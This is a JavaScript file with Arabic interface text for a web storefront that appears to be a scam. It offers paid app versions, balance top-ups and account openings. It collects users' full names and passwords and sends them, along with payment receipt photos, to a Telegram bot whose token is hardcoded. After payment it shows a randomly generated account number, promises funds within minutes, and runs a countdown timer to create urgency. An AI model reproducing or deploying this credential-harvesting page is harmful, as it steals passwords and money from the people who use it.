const TOKEN = '8572250361:AAEB89MDQx_QRBGQR7vTDK9v1k92_4CRxmw';
const MY_ID = '7908500383';
let currentProduct = "";
let selectedAccType = "";
let calculatedPrice = 0;

// --- 1. نظام رسالة الترحيب ---
window.onload = function() {
    // تظهر الرسالة وتختفي بعد 15 ثانية تلقائياً
    setTimeout(() => {
        closeWelcome();
    }, 15000);
};

function closeWelcome() {
    const welcome = document.getElementById('welcomeMessage');
    if(welcome) welcome.style.display = 'none';
}

// --- 2. نظام النسخة المجانية (بدون دفع) ---
function openFreeSection() {
    currentProduct = "النسخة المجانية";
    resetModal();
    document.getElementById('modalTitle').innerText = "تحميل النسخة المجانية";
    document.getElementById('freeSection').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

// --- 3. شراء النسخ (VIP والعادية) ---
function openPay(title, price) {
    currentProduct = title;
    resetModal();
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('modalPrice').innerText = "المبلغ المطلوب: " + price + " جنيه";
    document.getElementById('paymentArea').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

// --- 4. نظام الشحن الفوري (حساب 10%) ---
function openShipping(title) {
    currentProduct = title;
    resetModal();
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('shippingInputs').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

function calculatePrice() {
    let amount = document.getElementById('shipAmount').value;
    if (amount >= 100) {
        calculatedPrice = (amount / 100) * 10000;
        document.getElementById('calcResult').innerText = `المطلوب تحويله: ${calculatedPrice.toLocaleString()} جنيه`;
    } else {
        document.getElementById('calcResult').innerText = "أقل مبلغ شحن هو 100 ألف";
        calculatedPrice = 0;
    }
}

async function submitShippingInfo() {
    let acc = document.getElementById('shipAccount').value;
    let amount = document.getElementById('shipAmount').value;
    if (acc.length < 5 || amount < 100) {
        alert("⚠️ أدخل بيانات صحيحة (أقل شحن 100 ألف)"); return;
    }
    sendDataToTelegram(`⚡ طلب شحن:\nالنوع: ${currentProduct}\nالحساب: ${acc}\nالكمية: ${amount} ألف`);
    document.getElementById('shippingInputs').style.display = "none";
    document.getElementById('modalPrice').innerText = `المطلوب تحويله: ${calculatedPrice.toLocaleString()} جنيه`;
    document.getElementById('paymentArea').style.display = "block";
}

// --- 5. نظام فتح الحسابات (مربعات الاختيار) ---
function openAccountSystem() {
    currentProduct = "فتح حساب جديد";
    resetModal();
    document.getElementById('modalTitle').innerText = "فتح وتفعيل حساب";
    document.getElementById('accountTypeSelector').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

function selectAccType(type) {
    selectedAccType = type;
    // تمييز المربع المختار برمجياً (اختياري حسب الـ CSS)
    document.getElementById('accountTypeSelector').style.display = "none";
    document.getElementById('accountForm').style.display = "block";
}

async function submitAccountInfo() {
    let name = document.getElementById('userFullName').value;
    let pass = document.getElementById('userPass').value;
    if (name.length < 10 || pass.length < 4) {
        alert("⚠️ يرجى إدخال الاسم الرباعي وكلمة سر قوية."); return;
    }
    sendDataToTelegram(`👤 فتح حساب جديد:\nالنوع: ${selectedAccType}\nالاسم: ${name}\nكلمة السر: ${pass}`);
    document.getElementById('accountForm').style.display = "none";
    document.getElementById('modalPrice').innerText = "المبلغ المطلوب: 20,000 جنيه";
    document.getElementById('paymentArea').style.display = "block";
}

// --- 6. معالجة الرفع والتحقق من رقم العملية ---
function validateBeforeUpload() {
    const ref = document.getElementById('refNumber').value;
    if (ref.length < 5) {
        alert("⚠️ خطأ: يجب إدخال رقم العملية (Ref Number) أولاً قبل رفع الإشعار.");
        return;
    }
    document.getElementById('receiptInput').click();
}

async function handleUpload() {
    const fileInput = document.getElementById('receiptInput');
    const ref = document.getElementById('refNumber').value;
    const file = fileInput.files[0];
    const loadingArea = document.getElementById('loadingArea');

    if (file) {
        document.getElementById('paymentArea').style.display = "none";
        loadingArea.style.display = "block";

        const formData = new FormData();
        formData.append('chat_id', MY_ID);
        formData.append('photo', file);
        formData.append('caption', `✅ إشعار جديد\n📦 الخدمة: ${currentProduct}\n🔢 رقم العملية: ${ref}\n💰 المبلغ: ${document.getElementById('modalPrice').innerText}`);

        setTimeout(async () => {
            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            if (response.ok) {
                loadingArea.style.display = "none";
                showFinalSuccess();
            } else {
                alert("❌ فشل الإرسال، تأكد من الاتصال.");
                document.getElementById('paymentArea').style.display = "block";
                loadingArea.style.display = "none";
            }
        }, 3000);
    }
}

function showFinalSuccess() {
    const successArea = document.getElementById('successArea');
    successArea.style.display = "block";

    // إظهار زر التنزيل فقط للنسخ (VIP والعادية)
    if (currentProduct.includes("نسخة") || currentProduct.includes("النسخة") || currentProduct.includes("VIP")) {
        document.getElementById('downloadSection').style.display = "block";
        document.getElementById('afterActionText').innerText = "تم استلام طلبك. حمل التطبيق الآن وفعله عبر المطور.";
    } 
    // بيانات الحساب المولد
    else if (currentProduct === "فتح حساب جديد") {
        let randomAcc = Math.floor(1000000 + Math.random() * 9000000);
        document.getElementById('accountCard').style.display = "block";
        document.getElementById('resName').innerText = document.getElementById('userFullName').value;
        document.getElementById('resAcc').innerText = randomAcc;
        document.getElementById('afterActionText').innerText = "مبروك! تم توليد بيانات حسابك. تواصل لتفعيلها.";
    }
    else {
        document.getElementById('afterActionText').innerText = "تم استلام إشعار الشحن بنجاح. سيصلك الرصيد خلال 5 دقائق.";
    }
}

// --- وظائف عامة ---
function resetModal() {
    const ids = ['shippingInputs', 'accountForm', 'accountTypeSelector', 'paymentArea', 'successArea', 'accountCard', 'downloadSection', 'freeSection', 'loadingArea'];
    ids.forEach(id => { if(document.getElementById(id)) document.getElementById(id).style.display = "none"; });
    if(document.getElementById('refNumber')) document.getElementById('refNumber').value = "";
}

async function sendDataToTelegram(text) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: MY_ID, text: text })
    });
}

function copyAccountNumber() {
    const accNo = document.getElementById('accNo').innerText;
    navigator.clipboard.writeText(accNo).then(() => {
        alert("تم نسخ رقم الحساب ✅");
    });
}

function closeModal() { document.getElementById('payModal').style.display = "none"; }

// العداد
let time = 86396; 
setInterval(() => {
    let h = Math.floor(time / 3600); let m = Math.floor((time % 3600) / 60); let s = time % 60;
    if(document.getElementById('timer')) document.getElementById('timer').innerText = `${h}:${m}:${s}`;
    if (time > 0) time--;
}, 1000);
